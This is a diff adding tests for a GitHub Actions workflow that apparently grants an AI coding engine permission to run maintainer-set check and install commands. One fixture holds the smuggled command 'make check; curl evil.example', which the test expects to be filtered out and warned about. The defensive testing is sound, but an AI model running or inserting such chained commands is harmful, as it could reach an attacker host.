@@ -1460,6 +1460,43 @@ describe("the security list (2026-10-13)", () => {
     expect(step("revise")).toContain('git log --format=%B "$BEFORE_SHA..HEAD" >> /tmp/aiswec-outgoing.txt');
   });
 
+  test("the checks and the install command a maintainer set are the engine's to run, each as written and only when plain", () => {
+    for (const stage of PREVIEW_STAGES) {
+      const yaml = yamls[stage] ?? "";
+      expect(/--allowedTools "[^"]*\$\{\{ steps\.gatelist\.outputs\.tools \}\}"/.test(yaml)).toBe(true);
+      const text = steps(yaml).find((step) => step.name === "Write the gate list")?.script ?? "";
+      const dir = mkdtempSync(join(tmpdir(), "aiswec-gates-"));
+      const out = join(dir, "output");
+      writeFileSync(out, "");
+      const run = Bun.spawnSync(["bash", "-c", text.replaceAll("/tmp/aiswec-gates.txt", join(dir, "gates.txt"))], {
+        env: { ...process.env, GITHUB_OUTPUT: out, GATES: "npm test\ncargo test --all-features\ngo test ./...\nmake check; curl evil.example\n", INSTALL: "pip install -r requirements.txt pytest" },
+      });
+      expect(run.exitCode).toBe(0);
+      expect(readFileSync(out, "utf8").trim()).toBe(
+        "tools=,Bash(npm test),Bash(cargo test --all-features),Bash(go test ./...),Bash(pip install -r requirements.txt pytest)",
+      );
+      expect(run.stdout.toString()).toContain("::warning::a check or the install command");
+      expect(readFileSync(join(dir, "gates.txt"), "utf8")).toContain("make check; curl evil.example");
+    }
+  });
+
+  test("a Python project runs on GitHub's Python, whose version is a Python version", () => {
+    for (const stage of PREVIEW_STAGES) {
+      const yaml = yamls[stage] ?? "";
+      const setup = stepText(yaml, "Setup Python");
+      expect(setup).toContain("if: steps.ctx.outputs.skip != 'true' && steps.cfg.outputs.runtime == 'python'");
+      expect(setup).toContain("python-version: ${{ steps.cfg.outputs.runtime_version }}");
+      expect(yaml.indexOf("      - name: Setup Python")).toBeLessThan(yaml.indexOf("      - name: Pre-install dependencies"));
+      const cfg = stepText(yaml, "Read .github/aiswec.yml");
+      expect(cfg).toContain('case "$RUNTIME" in bun|node|python|none)');
+      const pick = /^\s*(if \[ "\$RUNTIME" = python \].*)$/m.exec(cfg)?.[1] ?? "";
+      for (const [given, want] of [["1.3.14", "3.12"], ["", "3.12"], ["3.11", "3.11"], ["3", "3"]] as const) {
+        const result = Bun.spawnSync(["bash", "-c", `RUNTIME=python RUNTIME_VERSION='${given}'\n${pick}\nprintf '%s' "$RUNTIME_VERSION"`]);
+        expect([given, result.stdout.toString()]).toEqual([given, want]);
+      }
+    }
+  });
+
   test("the engine's transcript reaches the run log only where the log is private", () => {
     for (const stage of REPO_STAGES) {
       expect(yamls[stage]).toContain("show_full_output: ${{ github.event.repository.private && 'true' || 'false' }}");
